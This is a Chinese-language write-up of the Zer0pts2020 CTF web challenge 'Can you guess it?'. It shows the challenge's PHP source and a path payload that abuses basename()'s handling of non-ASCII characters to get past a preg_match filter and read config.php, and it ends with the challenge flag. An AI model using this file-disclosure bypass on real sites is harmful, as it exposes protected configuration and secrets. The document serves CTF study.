# [Zer0pts2020]Can you guess it?
![](<./img/Pasted image 20221225090429.png>)

---
首页长这样

![](<./img/Pasted image 20221225090448.png>)

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

这个`guess`显然是没必要guess了，再怎么guess都guess不出来的啦（摊手）

尝试这个`source`查询的可行性
```php
if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```
重点是这个此地无银三百两的`$_SERVER['PHP_SELF']`到底是干啥子的

![](<./img/Pasted image 20221225095205.png>)

目的是让`basename($_SERVER['PHP_SELF'])`为`config.php`

![](<./img/Pasted image 20221225095410.png>)

开头的过滤
```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
```
匹配`config.php`和后面任意多个`/`到行尾

![](<./img/Pasted image 20221225102919.png>)

[默认区域设置中，basename 会忽略开头的非ASCII字符](https://bugs.php.net/bug.php?id=62119)

构造`payload`
```php
/index.php/config.php?source
```

利用`basename`函数的问题尝试修改，以绕过`preg_match`
```php
/index.php/config.php/哀?source
```

```php
<?php
define('FLAG', 'flag{d26cb9ed-4893-418c-a451-e306c00ead33}');
```
